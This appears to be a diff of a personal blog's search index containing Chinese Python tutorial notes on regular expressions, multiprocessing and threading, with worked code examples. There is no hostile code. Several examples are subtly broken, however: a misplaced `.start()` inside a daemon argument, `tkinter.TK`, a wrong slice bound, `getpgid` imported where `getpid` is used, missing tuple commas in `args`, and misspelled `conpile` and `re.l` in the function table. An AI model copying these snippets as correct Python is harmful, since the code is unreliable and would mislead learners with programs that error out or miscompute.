通过daemon参数将参数设置为守护线程（主程序退出就不再保留执行）</span><br><span class="line">        # 在线程中处理耗时间的下载任务</span><br><span class="line">        <span class="built_in">DownLoadTaskHandler</span>(daemon=True.<span class="built_in">start</span>())</span><br><span class="line">    def <span class="built_in">show_about</span>():</span><br><span class="line">        tkinter.messagebox.<span class="built_in">showinfo</span>(<span class="string">&#x27;关于&#x27;</span>,<span class="string">&#x27;作者：张三&#x27;</span>)</span><br><span class="line">    top = tkinter.<span class="built_in">TK</span>()</span><br><span class="line">    top.<span class="built_in">title</span>(<span class="string">&#x27;单线程&#x27;</span>)</span><br><span class="line">    top.<span class="built_in">geometry</span>(<span class="string">&#x27;200×150&#x27;</span>)</span><br><span class="line">    top.<span class="built_in">wm_attributes</span>(<span class="string">&#x27;-topmost&#x27;</span>,True)</span><br><span class="line">    panel = tkinter.<span class="built_in">Frame</span>(top)</span><br><span class="line">    button1 = tkinter.<span class="built_in">Button</span>(panel,text=<span class="string">&#x27;下载&#x27;</span>,command=download)</span><br><span class="line">    button1.<span class="built_in">pack</span>(side=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">    button2 = tkinter.<span class="built_in">Button</span>(panel,text=<span class="string">&#x27;关于&#x27;</span>,command=show_about)</span><br><span class="line">    button2.<span class="built_in">pack</span>(side=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">    panel.<span class="built_in">pack</span>(side=<span class="string">&#x27;bottom&#x27;</span>)</span><br><span class="line">    tkinter.<span class="built_in">mainloop</span>()</span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure>
-<h3 id="例2：使用多进程对复杂任务进行“分而治之”"><a href="#例2：使用多进程对复杂任务进行“分而治之”" class="headerlink" title="例2：使用多进程对复杂任务进行“分而治之”"></a>例2：使用多进程对复杂任务进行“分而治之”</h3><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">from</span> multiprocessing import Process,Queue</span><br><span class="line"><span class="meta">from</span> random import randint</span><br><span class="line"><span class="meta">from</span> time import time</span><br><span class="line"></span><br><span class="line">def task_handler(curr_list,result_queue):</span><br><span class="line">    total = 0</span><br><span class="line">    for number <span class="meta">in</span> curr_list:</span><br><span class="line">        total += number</span><br><span class="line">    result_queue<span class="meta">.put(</span>total)</span><br><span class="line">def ma<span class="meta">in(</span>):</span><br><span class="line">    processes = []</span><br><span class="line">    number_lisst = [<span class="meta">x</span> for <span class="meta">x</span> <span class="meta">in</span><span class="meta"> range(</span>1,100000001)]</span><br><span class="line">    result_queue = Queue()</span><br><span class="line">    <span class="meta">index</span> = 0</span><br><span class="line">    # 启动8个进程将数据切片后进行运算</span><br><span class="line">    for _ <span class="meta">in</span><span class="meta"> range(</span>8):</span><br><span class="line">        p = Process(target=task_handler,args=(number_lisst[<span class="meta">index</span>:<span class="meta">index</span>+122500000],result_queue))</span><br><span class="line">        <span class="meta">index</span> += 12500000</span><br><span class="line">        processes.append(p)</span><br><span class="line">        p.start()</span><br><span class="line">    # 开始记录所有进程执行完成花费的时间</span><br><span class="line">    start =<span class="meta"> time(</span>)</span><br><span class="line">    for p <span class="meta">in</span> processes:</span><br><span class="line">        p.jo<span class="meta">in(</span>)</span><br><span class="line">    # 合并执行结果</span><br><span class="line">    total = 0</span><br><span class="line">    <span class="meta">while</span> <span class="meta">not</span> result_queue.empty():</span><br><span class="line">        total += result_queue.get()</span><br><span class="line">    p<span class="meta">rint(</span>total)</span><br><span class="line">    <span class="meta">end</span> =<span class="meta"> time(</span>)</span><br><span class="line">    p<span class="meta">rint(</span><span class="string">&#x27;Execution time:&#x27;</span>,(<span class="meta">end</span>-start),<span class="string">&#x27;s&#x27;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ma<span class="meta">in(</span>)</span><br></pre></td></tr></table></figure>
+    <title>12.字符串和正则表达式</title>
+    <url>/2020/02/13/12-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p><a href="https://deerchao.cn/tutorials/regex/regex.htm">正则表达式30分钟入门</a><br><span id="more"></span><br>|符号|解释|事例|说明|<br>|—-|——|—-|——|<br>|.|匹配任意字符|b.t|可以匹配bat/but/b#t/b1t等|<br>|\w|匹配字母/数字/下划线|b\wt|可以匹配bat/b1t/b_t等，但不能匹配b#t|<br>|\s|匹配空白字符（包括\r、\n、\t等）|love\syou|可以匹配love you|<br>|\d|匹配数字|\d\d|可以匹配01/23/99等|<br>|^|匹配字符串的开始|^The|可以匹配The开头的字符串|<br>|$|匹配字符串的结束|.exe$|可以匹配.exe结尾的字符串|<br>|\W|匹配非字母/数字/下划线|b\Wt|可以匹配b#t/b@t等 但不能匹配but/b1t/b_t等|<br>|\S|匹配非空白字符|love\Syou|可以匹配Love#you等 但不能匹配love you等|<br>|\D|匹配非数字|\d\D|可以匹配9a/3#/0Fd等|<br>|\B|匹配非单词边界|\Bio\B||<br>|[]| 匹配来自字符集的任意单一字符 | [aeoou]|可以匹配任一原因字母字符|<br>|<sup><a href="#fn_" id="reffn_"></a></sup>|匹配不在字符集中的任意单一字符|<sup><a href="#fn_aeiou" id="reffn_aeiou">aeiou</a></sup>|可以匹配任一非元音字母字符|<br>|<em> | 匹配0次或多次|\W</em>||<br>|+|匹配1次或多次|\W+||<br>|?|匹配0次或1次|\W?||<br>|{N}|匹配N次|\w{3}|<br>|{M,}|匹配至少M次|\w{3,}||<br>|{M,N}|匹配至少M次至多N次|\w{3,6}||<br>| | |分支|foo | bar|可以匹配foo或者bar|<br>|(?#)|注释|||<br>|(exp)|匹配exp并捕获到自动命名的组中|||<br>|(?\<name\>exp)|匹配exp并捕获到名为name的组中|||<br>|(?:exp)|匹配exp但是不捕获匹配的文本|||<br>|(?=exp)|匹配exp前面的位置|\b\w(?=ing)|可以匹配I’m dancing中的danc|<br>|(?&lt;=exp)|匹配exp后面的位置|(?&lt;=\bdanc)\w+\b|可以匹配I love dancing and reading中的第一个ing|<br>|(?!exp)|匹配后面不是exp的位置|||<br>|(?&lt;!exp)|匹配前面不是exp的位置|||<br>|<em>?|重复任意次，但尽可能少重复|a.</em>b a.*?b|将正则表达式应用与aabab，前者会匹配整个字符串aabab，后者会匹配aab和ab两个字符串|<br>|+?|重复1次或多次，但尽可能少重复|||<br>|??|重复0次或1次，但尽可能少重复|||<br>|{M,N}?|重复M到N次，但尽可能少重复|||<br>|{M,}?|重复M次以上，但尽可能少重复|||</name\></p>
+<blockquote>
+<p>说明：如果需要匹配的字符是正则表达式中的特殊字符，那么可以使用\进行转义处理，例如想匹配小数点可以写成.就可以了，因为直接写.会匹配任意字符；同理，想匹配圆括号必须写成(和)，否则圆括号被视为正则表达式中的分组。</p>
+</blockquote>
+<h2 id="Python对正则表达式的支持"><a href="#Python对正则表达式的支持" class="headerlink" title="Python对正则表达式的支持"></a>Python对正则表达式的支持</h2><p>Python提供了re模块来支持正则表达式相关操作，下面时re模块中的核心函数</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>conpile(pattern,flags=0)</td>
+<td>编译正则表达式返回正则表达式对象</td>
+</tr>
+<tr>
+<td>match(pattern,string,flags=0)</td>
+<td>用正则表达式匹配字符串 成功返回匹配对象 否则返回None</td>
+</tr>
+<tr>
+<td>search(pattern,string,flags=0)</td>
+<td>搜索字符串中第一次出现正则表达式的模块 成功返回匹配对象 否则返回None</td>
+</tr>
+<tr>
+<td>split(pattern,string,maxsplit=0,flags=0)</td>
+<td>用正则表达式指定的模块分隔符拆分字符串 返回列表</td>
+</tr>
+<tr>
+<td>sub(pattern,repl,string,count=0,flags=0)</td>
+<td>用指定的字符串替换元字符串中与正则表达式匹配的模式 可以用count指定替换的次数</td>
+</tr>
+<tr>
+<td>fullmatch(pattern,string,flags=0)</td>
+<td>match函数的完全匹配（从字符串开始到结尾）版本</td>
+</tr>
+<tr>
+<td>findall(pattern,string,flags=0)</td>
+<td>查找字符串所有与正则表达式匹配的模式 返回字符串的列表</td>
+</tr>
+<tr>
+<td>finditer(pattern,string,flags=0)</td>
+<td>查找字符串所有与正则表达式匹配的模式 返回一个迭代器</td>
+</tr>
+<tr>
+<td>purge()</td>
+<td>清除隐式编译的正则表达式的缓存</td>
+</tr>
+<tr>
+<td>re.l/re.IGNORECASE</td>
+<td>忽略大小写匹配标记</td>
+</tr>
+<tr>
+<td>re.M/re.MULTILINE</td>
+<td>多行匹配标记</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p>说明： 上面提到的re模块中的这些函数，实际开发中也可以用正则表达式对象的方法替代对这些函数的使用，如果一个正则表达式需要重复的使用，那么先通过compile函数编译正则表达式并创建出正则表达式对象无疑是更为明智的选择。</p>
+</blockquote>
+<h3 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h3><p>验证输入用户名和qq号是否有效并给出对应的提示信息<br>要求：用户名必须由字母、数字或下划线构成且长度在6-20个字符之间，qq号是5-12的数字且首位不能为0<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span class="line">    qq = <span class="built_in">input</span>(<span class="string">&#x27;请输入qq号：&#x27;</span>)</span><br><span class="line">    <span class="comment"># match函数的第一个参数是正则表达式字符串或正则表达式对象</span></span><br><span class="line">    <span class="comment"># 第二个参数是要跟正则表达式做匹配的字符串对象</span></span><br><span class="line">    m1 = re.match(<span class="string">r&#x27;^[0-9a-z-A-Z_]&#123;6,20&#125;$&#x27;</span>,username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请输入有效的用户名.&#x27;</span>)</span><br><span class="line">    m2 = re.match(<span class="string">r&#x27;^[1-9]\d&#123;4,11&#125;$&#x27;</span>,qq)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请输入有效的QQ号.&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> m1 <span class="keyword">and</span> m2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;你输入的信息是有效的！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>提示： 上面在书写正则表达式时使用了“原始字符串”的写法（在字符串前面加上了r），<br>所谓“原始字符串”就是字符串中的每个字符都是它原始的意义，说得更直接一点就是字符串中没有所谓的转义字符啦。<br>因为正则表达式中有很多元字符和需要进行转义的地方，如果不使用原始字符串就需要将反斜杠写作\\，<br>例如表示数字的\d得书写成\\d，这样不仅写起来不方便，阅读的时候也会很吃力。</p>
+</blockquote>
+<h3 id="例2：从一段文字中提取出国内手机号码"><a href="#例2：从一段文字中提取出国内手机号码" class="headerlink" title="例2：从一段文字中提取出国内手机号码"></a>例2：从一段文字中提取出国内手机号码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 创建正则表达式对象 使用了前瞻和回顾来保证手机号前后不应该出现数字</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=\D)1[34578]\d&#123;9&#125;(?=\D)&#x27;</span>)</span><br><span class="line">    sentence = <span class="string">&#x27;重要的事情说8130123456789遍，我的手机号是13512346789这个靓号，不是15600998765，也是110或119，王大锤的手机号才是15600998765。&#x27;</span></span><br><span class="line">    <span class="comment"># 查找所有匹配并保存到一个列表中</span></span><br><span class="line">    mylist = re.findall(pattern,sentence)</span><br><span class="line">    <span class="built_in">print</span>(mylist)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------华丽的分割线--------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 通过迭代器取出匹配对象并获得匹配的内容</span></span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> pattern.finditer(sentence):</span><br><span class="line">        <span class="built_in">print</span>(temp.group())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------华丽的分割线--------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 通过search函数指定搜索位置找出所有的匹配</span></span><br><span class="line">    m = pattern.search(sentence)</span><br><span class="line">    <span class="keyword">while</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m.group())</span><br><span class="line">        m = pattern.search(sentence,m.end())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h3 id="例3-替换字符串中的不良内容"><a href="#例3-替换字符串中的不良内容" class="headerlink" title="例3 替换字符串中的不良内容"></a>例3 替换字符串中的不良内容</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def <span class="selector-tag">main</span>():</span><br><span class="line">    sentence = <span class="string">&#x27;你丫是傻叉吗？我操你大爷的.Fuck you.&#x27;</span></span><br><span class="line">    purified = re.<span class="built_in">sub</span>(<span class="string">&#x27;[操肏艹]|fuck|shit|傻[比屄逼叉缺吊屌]|煞笔&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,sentence,flags=re.IGNORECASE)</span><br><span class="line">    <span class="built_in">print</span>(purified)</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure>
+<h3 id="例4：拆分长字符串"><a href="#例4：拆分长字符串" class="headerlink" title="例4：拆分长字符串"></a>例4：拆分长字符串</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    poem = <span class="string">&#x27;窗前明月光，疑是地上霜。举头望明月，低头思故乡。&#x27;</span></span><br><span class="line">    sentence_list = re.split(<span class="string">r&#x27;[,。，.]&#x27;</span>,poem)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> sentence_list:</span><br><span class="line">        sentence_list.remove(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sentence_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>Python-100days</tag>
@@ -379,6 +359,26 @@
       </categories>
       <tags>
         <tag>软件安装</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>13.进程和线程</title>
+    <url>/2020/02/18/13.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>进程就是操作系统中执行的一个程序，操作系统以进程为单位分配存储空间，每个进程都有自己的地址空间、数据栈以及其他用于跟踪进程执行的辅助数据，操作系统管理所有进程的执行，为它们合理的分配资源。进程可以通过fork或spawn的方式来创建新的进程来执行其他的任务，不过新的进程也有自己独立的内存空间，因此必须通过进程间通信机制（IPC，Inter-Process Communication）来实现数据共享，具体的方式包括管道、信号、套接字、共享内存区等。<br>一个进程还可以拥有多个并发的执行线索，简单的说就是拥有多个可以获得CPU调度的执行单元，这就是所谓的线程。由于线程在同一个进程下，它们可以共享相同的上下文，因此对于进程而言，线程间的信息共享和通信更加容易。当然在单核DDPU系统中，真正的并发是不可能的，因为<strong>在某个时刻能够获得CPU的只有唯一的一个线程，多个线程共享了CPU的执行时间</strong>。使用多线程实现并发编程为程序带来的好处是不言而喻的，最主要的体现是提升程序的性能和改善用户体验。<br><span id="more"></span></p>
+<h2 id="Python中的多进程"><a href="#Python中的多进程" class="headerlink" title="Python中的多进程"></a>Python中的多进程</h2><p>Unix和Linux操作系统上提供了fork()系统调用来创建进程，调用fork()函数的是父进程，创建出的是子进程，子进程是父进程的一个拷贝，但是子进程拥有自己的PID。fork()函数非常特殊，它会返回两次，父进程中可以通过fork()函数的返回值得到子进程的PID，而子进程中的返回值永远都是0.Python的OS模块提供了fork()函数。由于Windows系统没有fork()调用，因此要实现跨平台的多进程编程，可以使用multiprocessing模块的Process类来创建子进程，而且该模块还提供了更高级的封装，例如批量启动进程的进程池（Pool）、用于进程间通信的队列（Queue）和管道（Pipe）等。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">from</span> random import randint</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> import <span class="selector-tag">time</span>,sleep</span><br><span class="line"></span><br><span class="line">def download_task(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载%s...&#x27;</span> % filename)</span><br><span class="line">    time_to_download = <span class="built_in">randint</span>(<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(time_to_download)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s下载完成！耗费了%d秒&#x27;</span> % (filename,time_to_download))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    start = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">download_task</span>(<span class="string">&#x27;Python从入门到住院.pdf&#x27;</span>)</span><br><span class="line">    <span class="built_in">download_task</span>(<span class="string">&#x27;Peking Hot.avi&#x27;</span>)</span><br><span class="line">    end = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总共耗费了%.2f秒.&#x27;</span> % (end-start))</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure><br>这个例子可以得出，如果程序中的代码只能按顺序一点点的往下执行，那么即使执行两个互不相关的下载任务，也需要先等待一个文件下载完成后才能开始下一个下载任务。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">from</span> multiprocessing import Process</span><br><span class="line"><span class="selector-tag">from</span> os import getpgid</span><br><span class="line"><span class="selector-tag">from</span> random import randint</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> import <span class="selector-tag">time</span>,sleep</span><br><span class="line"></span><br><span class="line">def download_task(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;启动下载进程，进程号[%d].&#x27;</span> % <span class="built_in">getpid</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载%s...&#x27;</span> % filename)</span><br><span class="line">    time_to_download = <span class="built_in">randint</span>(<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(time_to_download)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s下载完成！耗费了%d秒&#x27;</span> % (filename,time_to_download))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    start = <span class="built_in">time</span>()</span><br><span class="line">    p1 = <span class="built_in">Process</span>(target=download_task,args=(<span class="string">&#x27;Python从入门到住院.pdf&#x27;</span>))</span><br><span class="line">    p1.<span class="built_in">start</span>()</span><br><span class="line">    p2 = <span class="built_in">Process</span>(target=download_task,args=(<span class="string">&#x27;Peking Hot.avi&#x27;</span>))</span><br><span class="line">    p2.<span class="built_in">start</span>()</span><br><span class="line">    p1.<span class="built_in">join</span>()</span><br><span class="line">    p2.<span class="built_in">join</span>()</span><br><span class="line">    end = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总共耗费了%.2f秒.&#x27;</span> % (end-start))</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure><br>上面通过Process类创建了进程对象，通过target参数传入一个函数表示进程启动后要执行的代码，后面args是一个元祖，代表传递给函数的参数。Process和start方法用来启动进程，而join方法表示等待进程执行结束。两个任务同时启动了。</p>
+<p>也可以使用subprocess模块中的类和函数来创建和启动子进程，然后通过管道来和子进程通讯</p>
+<h2 id="Python中的多线程"><a href="#Python中的多线程" class="headerlink" title="Python中的多线程"></a>Python中的多线程</h2><p>Python通过thread模块（现在名为_thread）来实现多线程编程，该模块过于底层，而且很多功能都没有提供，推荐threading模块，该模块对多线程编程提供了更好的面对对象的封装。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">from</span> random import randint</span><br><span class="line"><span class="selector-tag">from</span> threading import Thread</span><br><span class="line"><span class="selector-tag">from</span> <span class="selector-tag">time</span> import <span class="selector-tag">time</span>,sleep</span><br><span class="line"></span><br><span class="line">def download(filename):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载%s...&#x27;</span> % filename)</span><br><span class="line">    time_to_download = <span class="built_in">randint</span>(<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">sleep</span>(time_to_download)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s下载完成！耗费%d秒&#x27;</span> % (filename,time_to_download))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    start = <span class="built_in">time</span>()</span><br><span class="line">    t1 = <span class="built_in">Thread</span>(target=download,args=(<span class="string">&#x27;Python从入门到住院.pdf&#x27;</span>))</span><br><span class="line">    t1.<span class="built_in">start</span>()</span><br><span class="line">    t2 = <span class="built_in">Thread</span>(target=download,args=(<span class="string">&#x27;Peking Hot.avi&#x27;</span>,))</span><br><span class="line">    t2.<span class="built_in">start</span>()</span><br><span class="line">    t1.<span class="built_in">join</span>()</span><br><span class="line">    t2.<span class="built_in">join</span>()</span><br><span class="line">    end = <span class="built_in">time</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;总共耗费了%.3f秒&#x27;</span> % (end-start))</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure><br>直接使用threading模块的Thread类来创建进程，但是我们之前讲过一个非常重要的概念叫“继承”，我们可以从已有的类创建类，因此可以通过继承Thread类的方式来创建自定义的线程类，然后再创建线程对象并启动线程。<br><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="title">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="title">from</span> time <span class="keyword">import</span> time,sleep</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">DownloadTask</span>(<span class="type">Thread</span>):</span></span><br><span class="line"><span class="class">    def __init__(<span class="title">self</span>, <span class="title">filename</span>):</span></span><br><span class="line"><span class="class">        super().__init__()</span></span><br><span class="line"><span class="class">        self._filename = filename</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">    def run(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        print(&#x27;开始下载%<span class="title">s</span>...&#x27; % <span class="title">self</span>.<span class="title">_filename</span>)</span></span><br><span class="line"><span class="class">        time_to_download = randint(5,10)</span></span><br><span class="line"><span class="class">        sleep(<span class="title">time_to_download</span>)</span></span><br><span class="line"><span class="class">        print(&#x27;%<span class="title">s</span>下载完成！耗费%<span class="title">d</span>秒&#x27; % (<span class="title">self</span>.<span class="title">_filename</span>,<span class="title">time_to_download</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def main():</span></span><br><span class="line"><span class="class">    start = time()</span></span><br><span class="line"><span class="class">    t1 = <span class="type">DownloadTask</span>(&#x27;<span class="type">Python</span>从入门到住院.<span class="title">pdf&#x27;</span>)</span></span><br><span class="line"><span class="class">    t1.start()</span></span><br><span class="line"><span class="class">    t2 = <span class="type">DownloadTask</span>(&#x27;<span class="type">Peking</span> <span class="type">Hot</span>.<span class="title">avi&#x27;</span>)</span></span><br><span class="line"><span class="class">    t2.start()</span></span><br><span class="line"><span class="class">    t1.join()</span></span><br><span class="line"><span class="class">    t2.join()</span></span><br><span class="line"><span class="class">    end = time()</span></span><br><span class="line"><span class="class">    print(&#x27;总共耗费了%.2<span class="title">f</span>秒&#x27; % (<span class="title">end</span>-<span class="title">start</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="class">    main()</span></span><br></pre></td></tr></table></figure><br>多个线程可以共享进程的内存空间，要实现多个线程间的通信相对简单，设置一个全局变量，多个线程共享这个全局变量即可。但是当多个线程共享同一个变量（称之为资源）的时候，很有可能产生不可控的结果导致程序失效甚至崩溃。如果一个资源被多个线程竞争使用，通常称之为“临界资源”，对“临界资源”的访问需要加上保护，否则资源会处于“混乱”状态。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread,Lock</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Account</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._balance = <span class="number">0</span></span><br><span class="line">        self._lock = Lock() <span class="comment">#加锁保护对银行账户的操作</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deposit</span>(<span class="params">self,money</span>):</span></span><br><span class="line">        self._lock.acquire()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 计算存款后的余额</span></span><br><span class="line">            new_balance = self._balance + money</span><br><span class="line">            <span class="comment"># 模拟受理存款业务需要0.01秒的时间</span></span><br><span class="line">            sleep(<span class="number">0.01</span>)</span><br><span class="line">            <span class="comment"># 修改账户余额</span></span><br><span class="line">            self._balance = new_balance</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="comment"># 在finally中执行释放锁的操作保证正常异常锁都能释放</span></span><br><span class="line">            self._lock.release()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">balance</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._balance</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddMoneyThread</span>(<span class="params">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,account,money</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self._account = account</span><br><span class="line">        self._money = money</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._account.deposit(self._money)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    account = Account()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="comment"># 创建100个存款的线程向同一个账户存钱</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        t = AddMoneyThread(account,<span class="number">1</span>)</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="comment"># 等所有存款的线程都执行完毕</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;账户余额为：￥%d元&#x27;</span> % account.balance)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<h2 id="多进程还是多线程"><a href="#多进程还是多线程" class="headerlink" title="多进程还是多线程"></a>多进程还是多线程</h2><p>无论是多进程还是多线程，只要数量一多，效率肯定上不去，为什么呢？我们打个比方，假设你不幸正在准备中考，每天晚上需要做语文、数学、英语、物理、化学这5科的作业，每项作业耗时1小时。如果你先花1小时做语文作业，做完了，再花1小时做数学作业，这样，依次全部做完，一共花5小时，这种方式称为单任务模型。如果你打算切换到多任务模型，可以先做1分钟语文，再切换到数学作业，做1分钟，再切换到英语，以此类推，只要切换速度足够快，这种方式就和单核CPU执行多任务是一样的了，以旁观者的角度来看，你就正在同时写5科作业。</p>
